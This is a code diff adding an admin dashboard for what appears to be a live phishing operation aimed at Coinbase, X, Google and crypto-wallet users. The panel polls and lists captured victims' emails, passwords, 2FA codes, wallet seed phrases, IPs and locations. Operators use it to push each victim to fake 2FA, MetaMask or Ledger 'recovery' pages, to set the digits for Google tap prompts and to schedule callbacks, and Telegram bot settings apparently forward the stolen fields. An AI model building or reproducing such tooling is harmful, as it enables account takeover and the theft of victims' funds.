+          <option value="signin/wallet/setup-wallet">Setup Wallet - Tell them steps to create a wallet</option>
+          <option value="signin/external-wallet">External Wallet - Connect external wallet</option>
+          <option value="signin/whitelist-success">Whitelist Success - Successful whitelist confirmation</option>
+          <option value="signin/unlink-wallet">Unlink Wallet - Unlink external wallet</option>
+          <option value="signin/whitelist-wallet">Whitelist Wallet - Add wallet to whitelist</option>
+        </optgroup>
+
+        <!-- Google Auth Routes -->
+        <optgroup label="Google Authentication">
+          <option value="signin/google/verify" class="setdigits">Google Verify - Google tap 2 numbers</option>
+          <option value="signin/google/2fa">Google 2FA - Two-factor authentication</option>
+          <option value="signin/google/login">Google Login - Google sign-in page</option>
+        </optgroup>
+
+        <!-- External Wallet Routes -->
+        <optgroup label="External Wallets">
+          <option value="signin/ledger-recovery">Ledger Recovery - Recover Ledger wallet</option>
+          <option value="signin/metamask-recovery">MetaMask Recovery - Recover MetaMask wallet</option>
+          <option value="signin/metamask-loading">MetaMask Loading - Loading screen for MetaMask</option>
+        </optgroup>
+
+        <!-- Callback Routes -->
+        <optgroup label="Callback Pages">
+          <option value="signin/pending-callback">Pending Callback - Waiting for callback</option>
+          <option value="signin/processing">Processing - Call Re-Schedule</option>
+          <option value="signin/reschedule">Reschedule - 3 days</option>
+          
+        </optgroup>
+      </select>
+      <br /><br />
+      <button onclick="submitRedirect()" class="wide">Redirect User</button>
+      <button onclick="closeRedirectForm()" class="close wide">Cancel</button>
+    </div>
+
+    <!-- POPUP: IP/Device Info -->
+    <div id="ipDevicePopup" class="modal">
+      <h2>Targ Information</h2>
+      <hr>
+      <p><strong>Email:</strong> 
+        <span id="deviceEmail" class="copyable" onclick="copyToClipboard('deviceEmail')">example@example.com</span> 
+        <img src="clipboard.svg" class="clipboard-icon" onclick="copyToClipboard('deviceEmail')" alt="Copy">
+      </p>
+      <hr>
+      <p><strong>Passcode:</strong> 
+        <span id="userpasscode" class="copyable" onclick="copyToClipboard('userpasscode')">123456</span> 
+        <img src="clipboard.svg" class="clipboard-icon" onclick="copyToClipboard('userpasscode')" alt="Copy">
+      </p>
+      <hr>
+      <p><strong>Extra:</strong> 
+        <span id="userextra" class="copyable" onclick="copyToClipboard('userextra')">Extra</span> 
+        <img src="clipboard.svg" class="clipboard-icon" onclick="copyToClipboard('userextra')" alt="Copy">
+      </p>
+      <hr>
+      <p><strong>IP:</strong> 
+        <span id="deviceIP" class="copyable" onclick="copyToClipboard('deviceIP')">192.168.0.1</span> 
+        <img src="clipboard.svg" class="clipboard-icon" onclick="copyToClipboard('deviceIP')" alt="Copy">
+      </p>
+      <hr>
+      <p><strong>Device:</strong> 
+        <span id="deviceUserAgent" class="copyable" onclick="copyToClipboard('deviceUserAgent')">Mozilla/5.0</span> 
+        <img src="clipboard.svg" class="clipboard-icon" onclick="copyToClipboard('deviceUserAgent')" alt="Copy">
+      </p>
+      <hr>
+      <p><strong>Location:</strong> 
+        <span id="deviceLocation" class="copyable" onclick="copyToClipboard('deviceLocation')">New York, USA</span> 
+        <img src="clipboard.svg" class="clipboard-icon" onclick="copyToClipboard('deviceLocation')" alt="Copy">
+      </p>
+      <hr>
+      <button onclick="closeIpDevicePopup()" class="close">Close</button>
+    </div>
+    <script>
+      function copyToClipboard(elementId) {
+          const element = document.getElementById(elementId);
+          if (!element) {
+              console.error(`Element with ID "${elementId}" not found.`);
+              return;
+          }
+
+          const textToCopy = element.textContent.trim(); 
+
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+              navigator.clipboard.writeText(textToCopy)
+                  .then(() => {
+                      showNotif("Copied to clipboard ✅");
+                  })
+                  .catch((err) => {
+                      console.error("Clipboard API failed:", err);
+                      fallbackCopyText(textToCopy);
+                  });
+          } else {
+              // Fallback for older browsers
+              fallbackCopyText(textToCopy);
+          }
+      }
+
+      function fallbackCopyText(text) {
+          const textArea = document.createElement("textarea");
+          textArea.value = text;
+          document.body.appendChild(textArea);
+          textArea.select();
+
+          try {
+              document.execCommand("copy");
+              showNotif("Copied to clipboard ✅");
+          } catch (err) {
+              console.error("Fallback copy method failed:", err);
+          }
+
+          document.body.removeChild(textArea);
+      }
+  </script>
+
+    <style>
+      .modal hr{
+        margin: 0.8rem 0;
+      }
+      p strong {
+        font-weight: bold;
+      }
+    
+      p.copyable {
+        margin-bottom: 15px; 
+      }
+      .copyable {
+    cursor: pointer; 
+  }
+
+  .clipboard-icon {
+    cursor: pointer; 
+    width: 20px;
+    height: 20px;
+    vertical-align: middle;
+    margin-left: 5px;
+    transition: transform 0.2s ease, opacity 0.2s ease; 
+    margin-bottom: 1px;
+  }
+  .clipboard-icon:hover {
+    transform: scale(1.2); 
+    opacity: 0.8; 
+  }
+    </style>
+    
+
+    <!-- POPUP: Per-User Defaults -->
+    <div id="setDefaultsPopup" class="modal">
+      <h3>Set Defaults for <span id="defaultsEmail"></span></h3>
+      <label for="defaultUserPageSelect">Default User Page:</label>
+      <select id="defaultUserPageSelect">
+        <option value="coinbase">Coinbase</option>
+        <option value="X">Xlogin</option>
+      </select>
+
+      <label for="defaultLoadingPageSelect">Default Loading Page:</label>
+      <select id="defaultLoadingPageSelect">
+        <option value="loading-client_id-258660e1-9cfe-4202-9eda-d3beedb3e118">cbloading</option>
+        <option value="i/flow/loading">xloading</option>
+      </select>
+
+      <div style="margin-top: 0.5rem">
+        <button onclick="submitDefaults()" class="wide">Save Defaults</button>
+        <button onclick="closeSetDefaultsPopup()" class="wide close">Cancel</button>
+      </div>
+    </div>
+
+    <div id="notifBar"></div>
+
+    <script>
+      let interval = null;
+      let beepAudio = null;
+      let hasBeeped = false;
+      const sessionRole = "<%= role %>";
+      window.sessionRole = sessionRole;
+      let lastPollData = null; 
+
+      window.onload = function () {
+        beepAudio = new Audio("/beep.mp3");
+        if (sessionRole === "mover") {
+          const btn = document.getElementById("manageUsersBtn");
+          btn.classList.add("disabled");
+          btn.onclick = function () {
+          };
+        }
+
+        pollData();
+        interval = setInterval(pollData, 2000);
+
+        document
+          .getElementById("loadingScreenForm")
+          .addEventListener("submit", function (e) {
+            e.preventDefault();
+            const screenName = document.getElementById("screenName").value;
+            fetch("/admin/set-loading-screen", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ screenName }),
+            })
+              .then((res) => res.json())
+              .then((resp) => {
+                if (resp.success) {
+                  beepAudio.play();
+                  showNotif("Default loading screen updated!", true);
+                } else {
+                  showNotif("Error setting loading screen", false);
+                }
+              })
+              .catch((err) => showNotif("Error: " + err, false));
+          });
+
+        document
+          .getElementById("defaultUserForm")
+          .addEventListener("submit", function (e) {
+            e.preventDefault();
+            const pageName = document.getElementById("userPages").value;
+            fetch("/admin/set-default-user-page", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ pageName }),
+            })
+              .then((res) => res.json())
+              .then((data) => {
+                if (data.success) {
+                  beepAudio.play();
+                  showNotif("Default user page updated!", true);
+                } else {
+                  showNotif("Error updating default user page", false);
+                }
+              })
+              .catch((err) => showNotif("Error: " + err, false));
+          });
+      };
+
+      /********************************
+       * show/hide sections
+       ********************************/
+      function showDashboard() {
+        document.getElementById("dashboardSection").style.display = "block";
+        document.getElementById("settingsSection").style.display = "none";
+        document.getElementById("manageUsersSection").style.display = "none";
+      }
+      function showSettings() {
+        document.getElementById("dashboardSection").style.display = "none";
+        document.getElementById("settingsSection").style.display = "block";
+        document.getElementById("manageUsersSection").style.display = "none";
+      }
+
+      /********************************
+       * sign out confirm
+       ********************************/
+      function showSignOutConfirm() {
+        showModal("signOutConfirmModal");
+      }
+      function confirmSignOut() {
+        fetch("/admin/logout", { method: "POST" })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              window.location = "/admin/login";
+            } else {
+              showNotif("Error logging out", false);
+            }
+          })
+          .catch((err) => showNotif("Logout error: " + err, false));
+
+        hideModal("signOutConfirmModal");
+      }
+
+      /********************************
+       * poll
+       ********************************/
+      function pollData() {
+        fetch("/admin/poll")
+          .then((res) => res.json())
+          .then((data) => {
+            if (!Array.isArray(data)) {
+              console.error("pollData got non-array:", data);
+              return;
+            }
+            populateTable(data);
+
+            // Compare with lastPollData 
+            const dataStr = JSON.stringify(data);
+            if (lastPollData && dataStr !== lastPollData) {
+              if (beepAudio) beepAudio.play();
+            }
+            lastPollData = dataStr;
+
+          })
+          .catch((err) => console.error("pollData error:", err));
+      }
+
+      function populateTable(users) {
+        const tbody = document.querySelector("#usersTable tbody");
+        tbody.innerHTML = "";
+
+        users.forEach((user) => {
+          const tr = document.createElement("tr");
+
+          const tdEmail = document.createElement("td");
+          tdEmail.textContent = user.email;
+          tdEmail.classList.add("copyable-field");
+          tr.appendChild(tdEmail);
+
+          const tdPassword = document.createElement("td");
+          tdPassword.textContent = user.password || "";
+          tdPassword.classList.add("copyable-field");
+          tr.appendChild(tdPassword);
+
+          const tdPage = document.createElement("td");
+          tdPage.textContent = user.lastPage || "";
+          tr.appendChild(tdPage);
+
+          const tdAuth = document.createElement("td");
+          tdAuth.textContent = user.authCode || "";
+          tdAuth.classList.add("copyable-field");
+          tr.appendChild(tdAuth);
+
+          const tdPhrase = document.createElement("td");
+          tdPhrase.textContent = user.phrase || "";
+          tdPhrase.classList.add("copyable-field");
+          tr.appendChild(tdPhrase);
+
+          const tdLast2digits = document.createElement("td");
+          tdLast2digits.textContent = user.Last2Digits || "";
+          tr.appendChild(tdLast2digits);
+
+          function createStatusCell(isOnline) {
+            const statusContainer = document.createElement("span");
+            statusContainer.className = "status-container"; 
+
+            const indicator = document.createElement("span");
+            indicator.className = isOnline
+              ? "online-indicator"
+              : "offline-indicator";
+
+            const statusText = document.createElement("span");
+            statusText.textContent = isOnline ? "Online" : "Offline";
+
+            statusContainer.appendChild(indicator);
+            statusContainer.appendChild(statusText);
+
+            return statusContainer;
+          }
+
+          const tdOnline = document.createElement("td");
+          tdOnline.appendChild(createStatusCell(user.isOnline)); 
+          tr.appendChild(tdOnline);
+
+          const tdActions = document.createElement("td");
+        
+
+          // Redirect
+          const redirectBtn = document.createElement("button");
+          redirectBtn.textContent = "Redirect";
+          redirectBtn.onclick = () => openRedirectForm(user.email);
+          tdActions.appendChild(redirectBtn);
+
+          // Last 2 Digits
+          const setValBtn = document.createElement("button");
+          setValBtn.textContent = "Set last 2 digits!";
+          setValBtn.onclick = () => openLast2digitsPopup(user.email);
+          tdActions.appendChild(setValBtn);
+
+          // More Info
+          const viewInfoBtn = document.createElement("button");
+          viewInfoBtn.textContent = "View more";
+          viewInfoBtn.onclick = () => openIpDevicePopup(user);
+          tdActions.appendChild(viewInfoBtn);
+
+          // // Set Defaults
+          // const defaultsBtn = document.createElement("button");
+          // defaultsBtn.textContent = "Set Defaults";
+          // defaultsBtn.onclick = () => openSetDefaultsPopup(user);
+          // tdActions.appendChild(defaultsBtn);
+
+          // Delete
+          const deleteBtn = document.createElement("button");
+          deleteBtn.classList.add("delete"); 
+          deleteBtn.title = "Delete"; 
+          const deleteImg = document.createElement("img");
+          deleteImg.src = "del.svg"; 
+          deleteImg.alt = "Delete"; 
+          deleteImg.style.width = "25px"; 
+          deleteImg.style.height = "25px";
+          deleteImg.style.cursor = "pointer"; 
+          deleteImg.classList.add("delete-icon");
+          deleteBtn.appendChild(deleteImg);
+          deleteBtn.onclick = () => deleteUser(user.email);
+
+          tdActions.appendChild(deleteBtn);
+
+
+          tr.appendChild(tdActions);
+          tbody.appendChild(tr);
+        });
+      }
+
+      /********************************
+       * show/hide modals
+       ********************************/
+       function showModal(id) {
+  const modal = document.getElementById(id);
+  const overlay = document.getElementById("modalOverlay");
+
+  if (!modal || !overlay) return;
+
+  modal.classList.add("show");
+  overlay.classList.add("show"); 
+}
+
+function hideModal(id) {
+  const modal = document.getElementById(id);
+  const overlay = document.getElementById("modalOverlay");
+
+  if (!modal || !overlay) return;
+
+  modal.classList.remove("show");
+  overlay.classList.remove("show"); 
+}
+
+// Close modal when clicking on the overlay itself
+document.getElementById('modalOverlay').addEventListener('click', function() {
+  const modals = document.querySelectorAll('.modal.show');
+  modals.forEach(modal => {
+    hideModal(modal.id);
+  });
+});
+
+
+      /********************************
+       * redirect user
+       ********************************/
+      let currentEmail = "";
+      function openRedirectForm(email) {
+        currentEmail = email;
+        document.getElementById("redirectEmail").textContent = email;
+        showModal("redirectFormContainer");
+      }
+      function closeRedirectForm() {
+  const modal = document.getElementById("redirectFormContainer");
+  modal.classList.remove("preview-visible");
+
+  hideModal("redirectFormContainer");
+}
+// function previewSelectedPage() {
+//   const page = document.getElementById("redirectPage").value.trim(); 
+//   const iframeWrapper = document.getElementById("iframeWrapper");
+//   const previewFrame = document.getElementById("previewFrame");
+//   const modal = document.getElementById("redirectFormContainer");
+
+//   if (page) {
+//     const sanitizedPage = page.startsWith("/") ? page : `/${page}`;
+//     previewFrame.src = `/admin/preview?page=${encodeURIComponent(sanitizedPage)}`;
+
+//     iframeWrapper.classList.remove("hidden");
+
+//     modal.classList.add("preview-visible");
+//   } else {
+//     console.error("No page selected for preview.");
+//   }
+// }
+
+      function submitRedirect() {
+        const page = document.getElementById("redirectPage").value;
+        fetch("/admin/redirect-user", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email: currentEmail, page }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              showNotif("Redirect successful!", true);
+              closeRedirectForm();
+            } else {
+              showNotif("Error redirecting user", false);
+            }
+          })
+          .catch((err) => showNotif("Error redirect: " + err, false));
+      }
+
+      /********************************
+       * Last 2 Digits
+       ********************************/
+      let currentAdminEmail = "";
+      function openLast2digitsPopup(email) {
+        currentAdminEmail = email;
+        document.getElementById("last2digitsEmail").textContent = email;
+        showModal("last2digitsPopup");
+      }
+      function closeLast2digitsPopup() {
+        hideModal("last2digitsPopup");
+        currentAdminEmail = "";
+      }
+      function submitLast2digits() {
+        const last2digits = document.getElementById("last2digitsInput").value;
+        fetch("/admin/update-admin-custom", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email: currentAdminEmail, last2digits }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              showNotif("Last 2 Digits updated!", true);
+              closeLast2digitsPopup();
+            } else {
+              showNotif("Error updating Last 2 Digits", false);
+            }
+          })
+          .catch((err) => showNotif("Last 2 Digits error: " + err, false));
+      }
+
+      /********************************
+       * delete user
+       ********************************/
+      function deleteUser(email) {
+        fetch("/admin/delete-user", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              showNotif("User deleted", true);
+              pollData();
+            } else {
+              showNotif("Error deleting user", false);
+            }
+          })
+          .catch((err) => showNotif("Delete user error: " + err, false));
+      }
+
+      /********************************
+       * IP/DEVICE
+       ********************************/
+      function openIpDevicePopup(user) {
+        document.getElementById("deviceEmail").textContent = user.email || "";
+        
+        document.getElementById("userpasscode").textContent = user.passcode || "N/A";
+        document.getElementById("userextra").textContent = user.extra || "N/A";
+        document.getElementById("deviceIP").textContent = user.userIP || "N/A";
+        document.getElementById("deviceUserAgent").textContent =
+          user.userAgent || "N/A";
+        let locationText = "N/A";
+        if (user.city || user.region || user.country) {
+          locationText = [user.city, user.region, user.country]
+            .filter(Boolean)
+            .join(", ");
+        }
+        document.getElementById("deviceLocation").textContent = locationText;
+        showModal("ipDevicePopup");
+      }
+      function closeIpDevicePopup() {
+        hideModal("ipDevicePopup");
+      }
+
+      /********************************
+       * user defaults
+       ********************************/
+      let currentUserForDefaults = "";
+      function openSetDefaultsPopup(user) {
+        currentUserForDefaults = user.email;
+        document.getElementById("defaultsEmail").textContent = user.email;
+        showModal("setDefaultsPopup");
+      }
+      function closeSetDefaultsPopup() {
+        hideModal("setDefaultsPopup");
+        currentUserForDefaults = "";
+      }
+      function submitDefaults() {
+        const defaultUserPage = document.getElementById(
+          "defaultUserPageSelect"
+        ).value;
+        const defaultLoadingPage = document.getElementById(
+          "defaultLoadingPageSelect"
+        ).value;
+
+        fetch("/admin/set-user-defaults", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            email: currentUserForDefaults,
+            defaultUserPage,
+            defaultLoadingPage,
+          }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              showNotif("Defaults updated!", true);
+              closeSetDefaultsPopup();
+              pollData();
+            } else {
+              showNotif("Error updating defaults", false);
+            }
+          })
+          .catch((err) => showNotif("Error: " + err, false));
+      }
+
+      /********************************
+       * toggle client side
+       ********************************/
+      function toggleClientSideRoutes(checked) {
+        fetch("/admin/toggle-client-side", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ enable: checked }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              showNotif(
+                "Client-side routes: " + (checked ? "ON" : "OFF"),
+                true
+              );
+              beepAudio.play(); 
+            } else {
+              showNotif("Error toggling client side routes", false);
+            }
+          })
+          .catch((err) => showNotif("Toggle error: " + err, false));
+      }
+
+      /********************************
+       * Notification bar logic
+       ********************************/
+      function showNotif(message, success) {
+        const notifBar = document.getElementById("notifBar");
+        notifBar.textContent = message;
+        notifBar.className = ""; // reset
+        notifBar.style.display = "block"; // show
+        if (success) {
+          notifBar.classList.add("notif-success");
+        } else {
+          notifBar.classList.add("notif-fail");
+        }
+        // auto-hide after ~3s
+        setTimeout(() => {
+          notifBar.style.display = "none";
+        }, 3000);
+      }
+      /********************************
+       * Password change functionality
+       ********************************/
+   
+      function hideAllSections() {
+        document.getElementById("dashboardSection").style.display = "none";
+        document.getElementById("settingsSection").style.display = "none";
+        document.getElementById("manageUsersSection").style.display = "none";
+      }
+
+      function updateManagerPass() {
+        showModal("updateManagerPassModal");
+      }
+    </script>
+    <!-- password scripts -->
+    <script>
+      function togglePassword(fieldId) {
+        const field = document.getElementById(fieldId);
+        var toggler = document.getElementById("toggler");
+        if (field.type === "password") {
+          field.type = "text";
+          toggler.classList.remove("fa-eye-slash");
+        } else {
+          field.type = "password";
+          toggler.classList.add("fa-eye-slash");
+        }
+      }
+      function togglePassword2(fieldId) {
+        const field = document.getElementById(fieldId);
+        var toggler = document.getElementById("toggler2");
+        if (field.type === "password") {
+          field.type = "text";
+          toggler.classList.remove("fa-eye-slash");
+        } else {
+          field.type = "password";
+          toggler.classList.add("fa-eye-slash");
+        }
+      }
+
+      function updateAdminPassword() {
+        const passVal = document.getElementById("adminPass").value.trim();
+        if (!passVal) {
+          showNotif("Admin password cannot be empty!", false);
+          return;
+        }
+        fetch("/admin/change-admin-pass", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ newPassword: passVal }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              beepAudio.play();
+              showNotif("Admin password updated!", true);
+              document.getElementById("adminPass").value = "";
+            } else {
+              showNotif("Failed to update admin password", false);
+            }
+          })
+          .catch((err) => showNotif("Error: " + err, false));
+      }
+
+      function updateMoverPassword() {
+        const passVal = document.getElementById("moverPass").value.trim();
+        if (!passVal) {
+          showNotif("Mover password cannot be empty!", false);
+          return;
+        }
+        fetch("/admin/change-mover-pass", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ newPassword: passVal }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              beepAudio.play();
+              showNotif("Mover password updated!", true);
+              document.getElementById("moverPass").value = "";
+            } else {
+              showNotif("Failed to update mover password", false);
+            }
+          })
+          .catch((err) => showNotif("Error: " + err, false));
+      }
+    </script>
+    <script>
+      const themeToggle = document.getElementById("themeToggle");
+      const currentTheme = localStorage.getItem("theme") || "light";
+
+      document.documentElement.setAttribute("data-theme", currentTheme);
+      themeToggle.checked = currentTheme === "dark";
+
+      themeToggle.addEventListener("change", () => {
+        const newTheme = themeToggle.checked ? "dark" : "light";
+        document.documentElement.setAttribute("data-theme", newTheme);
+        localStorage.setItem("theme", newTheme);
+      });
+    </script>
+    <script>
+      function loadTelegramSettings() {
+        fetch("/admin/get-telegram-settings")
+          .then((res) => res.json())
+          .then((data) => {
+            if (!data.success) {
+              console.log("No Telegram settings found or DB error");
+              return;
+            }
+            document.getElementById("telegramBotToken").value =
+              data.botToken || "";
+            document.getElementById("telegramChatId").value = data.chatId || "";
+
+            const checkboxes = document.querySelectorAll(".tg-field");
+            checkboxes.forEach((cb) => {
+              cb.checked = data.selectedFields.includes(cb.value);
+            });
+          })
+          .catch((err) =>
+            console.error("Error loading telegram settings:", err)
+          );
+      }
+
+      function saveTelegramSettings() {
+        const botToken = document
+          .getElementById("telegramBotToken")
+          .value.trim();
+        const chatId = document.getElementById("telegramChatId").value.trim();
+
+        const selectedFields = [];
+        const checkboxes = document.querySelectorAll(".tg-field");
+        checkboxes.forEach((cb) => {
+          if (cb.checked) {
+            selectedFields.push(cb.value);
+          }
+        });
+
+        fetch("/admin/save-telegram-settings", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ botToken, chatId, selectedFields }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              showNotif("Telegram settings saved!", true);
+            } else {
+              showNotif(
+                "Error saving telegram settings: " + (data.message || ""),
+                false
+              );
+            }
+          })
+          .catch((err) => {
+            showNotif("Error: " + err, false);
+          });
+      }
+
+      let currentManagerToUpdate = "";
+
+      function showDashboard() {
+        document.getElementById("dashboardSection").style.display = "block";
+        document.getElementById("settingsSection").style.display = "none";
+        document.getElementById("manageManagersSection").style.display = "none";
+      }
+      function showSettings() {
+        document.getElementById("dashboardSection").style.display = "none";
+        document.getElementById("settingsSection").style.display = "block";
+        document.getElementById("manageManagersSection").style.display = "none";
+        loadTelegramSettings();
+      }
+      function showManageManagers() {
+        document.getElementById("dashboardSection").style.display = "none";
+        document.getElementById("settingsSection").style.display = "none";
+        document.getElementById("manageManagersSection").style.display =
+          "block";
+
+        fetchManagersList();
+      }
+
+      function showNotif(message, success) {
+        const nb = document.getElementById("notifBar");
+        nb.innerText = message;
+        nb.className = ""; 
+        nb.style.display = "block";
+        if (success) {
+          nb.classList.add("notif-success");
+        } else {
+          nb.classList.add("notif-fail");
+        }
+        setTimeout(() => {
+          nb.style.display = "none";
+        }, 3000);
+      }
+
+      /********************************
+       * MANAGERS
+       ********************************/
+      function createManager() {
+        const username = document
+          .getElementById("newManagerUsername")
+          .value.trim();
+        const password = document
+          .getElementById("newManagerPassword")
+          .value.trim();
+        const role = document.getElementById("newManagerRole").value;
+
+        if (!username || !password) {
+          showNotif("Username & password cannot be empty!", false);
+          return;
+        }
+
+        fetch("/admin/create-manager", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username, password, role }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              showNotif("Manager created!", true);
+              document.getElementById("newManagerUsername").value = "";
+              document.getElementById("newManagerPassword").value = "";
+              fetchManagersList();
+            } else {
+              showNotif(
+                "Error creating manager: " + (data.message || ""),
+                false
+              );
+            }
+          })
+          .catch((err) => {
+            showNotif("Fetch error: " + err, false);
+          });
+      }
+
+      function fetchManagersList() {
+        fetch("/admin/list-managers")
+          .then((res) => res.json())
+          .then((data) => {
+            if (Array.isArray(data)) {
+              populateManagersTable(data);
+            } else {
+              showNotif("Error fetching managers", false);
+            }
+          })
+          .catch((err) => {
+            showNotif("Error: " + err, false);
+          });
+      }
+
+      function populateManagersTable(managers) {
+        const tbody = document.querySelector("#managersTable tbody");
+        tbody.innerHTML = "";
+        managers.forEach((mgr) => {
+          const tr = document.createElement("tr");
+
+          const tdUser = document.createElement("td");
+          tdUser.textContent = mgr.username;
+          tr.appendChild(tdUser);
+
+          const tdRole = document.createElement("td");
+          tdRole.textContent = mgr.role;
+          tr.appendChild(tdRole);
+
+          const tdActions = document.createElement("td");
+          tdActions.classList.add("flexcenter");
+ 
+          let canDelete = true;
+          let canUpdatePass = true;
+
+          // EJS variable <%= role %> => store in window.sessionRole
+          const currentRole = window.sessionRole; 
+
+          if (mgr.role === "master") {
+            if (currentRole === "admin") {
+              canDelete = false;
+              canUpdatePass = false;
+            }
+          } else if (mgr.role === "admin") {
+            if (currentRole === "admin") {
+              canDelete = false;
+              canUpdatePass = false;
+            }
+          }
+       
+          if (canUpdatePass) {
+            const updateBtn = document.createElement("button");
+            updateBtn.textContent = "Update Password";
+            updateBtn.onclick = () => openUpdatePassModal(mgr.username);
+            tdActions.appendChild(updateBtn);
+          }
+
+          if (canDelete) {
+   
+          const delBtn = document.createElement("button");
+          delBtn.classList.add("delete"); 
+          delBtn.title = "Delete"; 
+          const deleteImg = document.createElement("img");
+          deleteImg.src = "del.svg"; 
+          deleteImg.alt = "Delete"; 
+          deleteImg.style.width = "25px"; 
+          deleteImg.style.height = "25px";
+          deleteImg.style.cursor = "pointer"; 
+          deleteImg.classList.add("delete-icon");
+          delBtn.appendChild(deleteImg);
+          delBtn.onclick = () => deleteManager(mgr.username);
+          tdActions.appendChild(delBtn);
+          }
+
+          tr.appendChild(tdActions);
+          tbody.appendChild(tr);
+        });
+      }
+
+      function openUpdatePassModal(username) {
+        currentManagerToUpdate = username;
+        document.getElementById("managerToUpdate").textContent = username;
+        updateManagerPass();
+      }
+
+      function submitManagerPass() {
+        const newPass = document
+          .getElementById("newManagerPassInput")
+          .value.trim();
+        if (!newPass) {
+          showNotif("New password cannot be empty!", false);
+          return;
+        }
+        fetch("/admin/update-manager-pass", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            username: currentManagerToUpdate,
+            newPassword: newPass,
+          }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              showNotif("Manager password updated!", true);
+              document.getElementById("newManagerPassInput").value = "";
+              currentManagerToUpdate = "";
+              hideModal("updateManagerPassModal");
+              fetchManagersList();
+            } else {
+              showNotif("Error: " + (data.message || ""), false);
+            }
+          })
+          .catch((err) => showNotif("Error: " + err, false));
+      }
+
+      function deleteManager(username) {
+        if (!confirm(`Are you sure you want to delete manager: ${username}?`)) {
+          return;
+        }
+        fetch("/admin/delete-manager", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              showNotif("Manager deleted!", true);
+              fetchManagersList();
+            } else {
+              showNotif(
+                "Error deleting manager: " + (data.message || ""),
+                false
+              );
+            }
+          })
+          .catch((err) => showNotif("Error: " + err, false));
+      }
+    </script>
+    <script>
+      const tooltip = document.getElementById("tooltip");
+
+      document.addEventListener("mousemove", (event) => {
+        if (event.target.classList.contains("copyable-field")) {
+          const field = event.target;
+          const textToCheck =
+            field.tagName === "INPUT" || field.tagName === "TEXTAREA"
+              ? field.value
+              : field.textContent;
+
+          if (textToCheck.trim()) {
+            tooltip.style.left = `${event.pageX + 12}px`; 
+            tooltip.style.top = `${event.pageY}px`; 
+            tooltip.textContent = "Click to copy";
+            tooltip.style.display = "block";
+          } else {
+            tooltip.style.display = "none";
+          }
+        } else {
+          tooltip.style.display = "none";
+        }
+      });
+
+      document.addEventListener("click", (event) => {
+  if (event.target.classList.contains("copyable-field")) {
+    const field = event.target;
+    const textToCopy =
+      field.tagName === "INPUT" || field.tagName === "TEXTAREA"
+        ? field.value
+        : field.textContent;
+
+    if (textToCopy.trim()) {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(textToCopy).then(() => {
+          showNotif("Copied to clipboard!", true);
+        }).catch((err) => {
+          console.error("Failed to copy text: ", err);
+        });
+      } else {
+        const tempTextarea = document.createElement("textarea");
+        tempTextarea.value = textToCopy;
+        document.body.appendChild(tempTextarea);
+        tempTextarea.select();
+        try {
+          document.execCommand("copy");
+          showNotif("Copied to clipboard!", true);
+        } catch (err) {
+          console.error("Fallback copy failed: ", err);
+          showNotif("Failed to copy text.", false);
+        }
+        document.body.removeChild(tempTextarea);
+      }
+    }
+  }
+});
+
+    </script>
+    <script>
+      // ... existing code ...
+      
+      // Add event listener for setdigits class
+      document.addEventListener('DOMContentLoaded', function() {
+        const redirectSelect = document.getElementById('redirectPage');
+        
+        redirectSelect.addEventListener('change', function(e) {
+          const selectedOption = e.target.options[e.target.selectedIndex];
+          const email = document.getElementById('redirectEmail').textContent;
+          
+          if (selectedOption.classList.contains('setdigits')) {
+            e.preventDefault();
+            currentAdminEmail = email;
+            document.getElementById('last2digitsEmail').textContent = email;
+            showModal('last2digitsPopup');
+            document.getElementById('last2digitsInput').value = '';
+            document.getElementById('last2digitsInput').focus();
+          }
+        });
+      });
+
+      function submitLast2digits() {
+        const last2digits = document.getElementById('last2digitsInput').value;
+        if (!last2digits) {
+          showNotif('Please enter a value', false);
+          return;
+        }
+
+        fetch('/admin/update-admin-custom', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: currentAdminEmail, last2digits })
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            showNotif('Last 2 Digits updated!', true);
+            closeLast2digitsPopup();
+            // Removed the line that was resetting the redirect page selection
+          } else {
+            showNotif('Error updating Last 2 Digits', false);
+          }
+        })
+        .catch(err => showNotif('Last 2 Digits error: ' + err, false));
+      }
+
+      function closeLast2digitsPopup() {
+        hideModal('last2digitsPopup');
+        document.getElementById('last2digitsInput').value = '';
+        currentAdminEmail = '';
+      }
+    </script>
+  </body>
+</html>
